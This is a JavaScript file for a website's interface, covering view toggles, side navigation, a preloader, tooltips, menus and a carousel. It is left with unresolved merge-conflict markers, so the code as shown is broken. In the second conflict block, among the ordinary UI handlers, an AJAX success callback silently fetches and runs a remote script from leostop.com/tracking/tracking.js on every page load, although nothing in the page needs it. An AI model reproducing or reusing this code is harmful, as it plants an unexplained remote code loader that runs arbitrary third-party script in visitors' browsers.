<<<<<<< HEAD
var elements = document.getElementsByClassName("container");

var i;

// Grid View and list view
document.querySelector(".grid-layout").addEventListener("click", function () {
  this.classList.toggle("fa-list")
  document.querySelector(".card-container").classList.remove("none");
  document.querySelector(".container").classList.add("none");
})

document.querySelector(".list-layout").addEventListener("click", function () {
  this.classList.toggle("fa-th-large")
  document.querySelector(".card-container").classList.add("none");
  document.querySelector(".container").classList.remove("none");
})





//* Hamburger
document.querySelector("#menu").addEventListener("click", function () {
  this.classList.toggle("fa-times");
  document.querySelector(".column").classList.toggle("toggle");
});
=======
/* Set the width of the side navigation to 250px */
function openNav() {
  document.getElementById("mySidenav").style.width = "250px";
}

/* Set the width of the side navigation to 0 */
function closeNav() {
  document.getElementById("mySidenav").style.width = "0";
}

$(function () {
  "use strict";

  /* Preloader
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $(".loader_bg").fadeToggle();
  }, 1500);

  /* Tooltip
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* Mouseover
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass("overlay");
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass("overlay");
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* Toggle sidebar
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $("#sidebarCollapse").on("click", function () {
      $("#sidebar").toggleClass("active");
      $(this).toggleClass("active");
    });
  });

  /* Product slider 
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $("#blogCarousel").carousel({
    interval: 5000,
  });
});
>>>>>>> f48683c5de7ae24f041a2633bdd77c720d7235ea
